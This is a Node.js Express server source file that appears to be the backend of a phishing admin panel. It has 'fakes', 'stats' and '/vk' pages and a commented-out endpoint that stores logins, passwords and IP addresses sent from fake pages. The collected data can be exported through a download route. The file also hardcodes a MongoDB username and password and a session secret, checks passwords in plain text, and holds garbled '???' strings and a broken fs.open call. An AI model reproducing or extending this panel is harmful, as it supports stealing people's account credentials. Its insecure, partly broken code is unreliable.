//Initialise variables from modules
const express = require("express");
const fs = require("fs")
const bodyParser = require("body-parser");
const session = require("express-session");
const MongoClient = require("mongodb").MongoClient;
const MongoDBStore = require("connect-mongodb-session")(session);
//enable express
const app = express();
// const http = require('http');
// const server = http.createServer(app);
// const {
//   Server
// } = require("socket.io");
// const io = new Server(server);
const path = require("path");

//app.set('trust proxy', 1);
app.use(express.static(path.join(__dirname, "public")));

let store = new MongoDBStore({
  uri: "mongodb+srv://Gachinski:qwertyuiop@cluster0.qg8s1.mongodb.net/",
  databaseName: "test",
  collection: "session"
});

//Auth at mongoDB
const mongoClient = new MongoClient(
  "mongodb+srv://Gachinski:qwertyuiop@cluster0.qg8s1.mongodb.net/test?retryWrites=true&w=majority", {
    useNewUrlParser: true,
    useUnifiedTopology: true
  }
);

//Connect to mongoDB
mongoClient.connect(function (err, client) {
  app.use(
    require("express-session")({
      secret: "This is a secret",
      cookie: {
        maxAge: 1000 * 60 * 60 * 24
      },
      store: store,
      resave: true,
      saveUninitialized: true
    })
  );

  //Body-parser
  app.use(bodyParser.json({
    limit: "100mb"
  }));
  app.use(bodyParser.urlencoded({
    limit: "100mb",
    extended: true
  }));
  //CORS permissions
  app.use(function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Methods", "GET,PUT,POST,DELETE");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    next();
  });
  // let i = 0
  // app.post('/x', function (req, res) {
  //   i++
  //   res.send('lol')
  //   io.emit('notification', {
  //     icon: './media/bug.svg',
  //     text: req.body.text,
  //     date: +new Date,
  //     counter: i
  //   });
  // })


  //GET(POST) data from fakes
  // app.post("/AddNewAccount", bodyParser, function (request, response) {
  //     collection.insertOne({
  //         login: request.body.login,
  //         password: request.body.password,
  //         ip: request.body.ip
  //     }, function (err, result) {
  //         if (err) {
  //             console.log(err)
  //         }
  //     })
  // })

  //Check token to accsess profile page
  let TokenCheck = (request, response, next) => {
    if (request.session.user) {
      next();
    } else {
      response.redirect("/login");
      next();
    }
  };
  let TokenCheckLogin = (request, response, next) => {
    if (request.session.user) {
      response.redirect("/profile");
    } else {
      next();
    }
  };

  //Log in function and update token
 
  app.post("/auth", function (request, response, next) {
    if (request.body) {
      client
        .db("DB")
        .collection("config")
        .findOne({
            login: request.body.login,
            password: request.body.password
          },
          function (err, data) {
            if (data !== null) {
              request.session.user = {
                id: data["_id"],
                name: request.body.login
              }
              response.redirect("/profile")
            } else {
              response.send('502')
            }
          }
        );
    }
  });
  app.post('/download', (req, res) => {
    function GetData(ids) {
      // let array = []
      // ids.forEach(e => {

      // })
      return ids
    }

    function FileName(count) {
      let string = '??????????????',
        ending = '',
        MainDate = new Date(),
        year = MainDate.getFullYear(),
        month = MainDate.getMonth(),
        date = MainDate.getDate(),
        hour = MainDate.getHours(),
        minute = MainDate.getMinutes(),
        second = MainDate.getSeconds(),
        GMT = 3
      let e = count.toString().substr(-1)
      if (e == 1) {} else if (e >= 2 && e <= 4) {
        ending = '??'
      } else {
        ending = '????'
      }

      if (month.toString().length == 1) {
        month = '0' + month
      }
      if (date.toString().length == 1) {
        date = '0' + date
      }
      if (hour.toString().length == 1) {
        hour = '0' + hour
      }
      if (minute.toString().length == 1) {
        minute = '0' + minute
      }
      if (second.toString().length == 1) {
        second = '0' + second
      }
      let dateFormat = `[${hour+GMT}???${minute}???${second} ??? ${date}.${month}.${year}]`
      return `${dateFormat} ${count} ${string+ending}`
    }

    function CreateFile(data) {
      let name = FileName(data.length),
        FileContent = ''
      data.forEach(e => {
        FileContent += e + '\n'
      })
      fs.open(`${__dirname}/public/download/${name}.txt`, "w", err, data => {
        if (err) {
          throw err;
        } else {
          fs.writeFile(`${__dirname}/public/download/${name}.txt`, FileContent, err => {
            if (err) {
              throw err;
            } else {
              res.download(`${__dirname}/public/download/${name}.txt`)
            }
          })
        }
      })
    }

    function ClearFolder(content) {
      fs.readdir(__dirname + "/public/download", function (err, data) {
        if (err) {
          //ERROR
        } else {
          if (data.length !== 0) {
            data.forEach(e => {
              fs.unlink(__dirname + "/public/download/" + e, (err) => {
                if (err) throw err;
              })
            })
            CreateFile(content)
          } else {
            CreateFile(content)
          }
        }
      })
    }
    if (req.body) {
      ClearFolder(GetData(req.body.data))
    }
  })
  app.get('/download', (req, res) => {
    fs.readdir(__dirname + "/public/download", function (err, data) {
      if (err) {
        //ERROR
      } else {
        res.download(`${__dirname}/public/download/${data[0]}`)
      }
    })
  })
  //connecting HTML files


  app.get("/logout", TokenCheck, function (request, response) {
    request.session.destroy();
    response.redirect("/login");
  });
  app.post("/getData", TokenCheck, function (request, response) {
    response.send({
      login: request.session.user.name
    });
  });
  app.get("/login", TokenCheckLogin, function (request, response) {
    response.sendFile(__dirname + "/public/pages/" + "login_page.html");
  });
  app.get("/panel", TokenCheck, function (request, response) {
    response.sendFile(__dirname + "/public/pages/" + "panel.html");
  });
  app.get("/stats", TokenCheck, function (request, response) {
    response.sendFile(__dirname + "/public/pages/" + "stats.html");
  });
  app.get("/settings", TokenCheck, function (request, response) {
    response.sendFile(__dirname + "/public/pages/" + "settings.html");
  });
  app.get("/fakes", TokenCheck, function (request, response) {
    response.sendFile(__dirname + "/public/pages/" + "fakes.html");
  });
  app.get("/profile", TokenCheck, function (request, response) {
    response.sendFile(__dirname + "/public/pages/" + "profile.html");
  });
  app.get("/", TokenCheck, function (request, response) {
    response.redirect("/login");
  });
  app.get("/vk", (req, res) => {});
  //CSS files
  app.use("/style.css", function (req, res) {
    res.sendFile(__dirname + "/public/css/" + "style.css");
  });

  //connecting JS files
  app.use("/Auth.admin.js", function (req, res) {
    res.sendFile(__dirname + "/public/js/" + "Auth.admin.js")
  })
  app.use("/profile.scripts.js", function (req, res) {
    res.sendFile(__dirname + "/public/js/" + "profile.scripts.js")
  })
  app.use("/fakes.scripts.js", function (req, res) {
    res.sendFile(__dirname + "/public/js/" + "fakes.scripts.js")
  })
  app.use("/panel.scripts.js", function (req, res) {
    res.sendFile(__dirname + "/public/js/" + "panel.scripts.js")
  })
  app.use("/main.scripts.js", function (req, res) {
    res.sendFile(__dirname + "/public/js/" + "main.scripts.js")
  })
})
//Socket io integration 
// io.on('connection', (socket) => {
//   console.log('a user connected');
// });

//Starting server
app.listen(process.env.PORT || 5000, function () {
  console.log("???????????? ??????????????: " + process.env.PORT)
})